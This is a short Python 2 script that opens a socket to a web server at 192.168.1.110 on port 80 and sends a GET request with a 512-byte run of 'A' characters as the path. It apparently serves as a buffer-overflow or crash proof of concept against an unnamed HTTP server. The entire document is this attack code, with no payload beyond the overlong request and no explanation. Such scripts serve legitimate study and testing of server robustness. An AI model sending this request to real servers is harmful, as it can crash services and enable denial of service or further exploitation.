#!/usr/bin/python
 
import socket
 
host   = '192.168.1.110'
port   = 80
header = 'GET /' + ('A'*512) + ' HTTP/1.0\r\nHost: ' + host + '\r\nConnection: Close\r\n\r\n'
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
 
print 'Sending header...'
 
s.send(header)
 
print 'Done!'
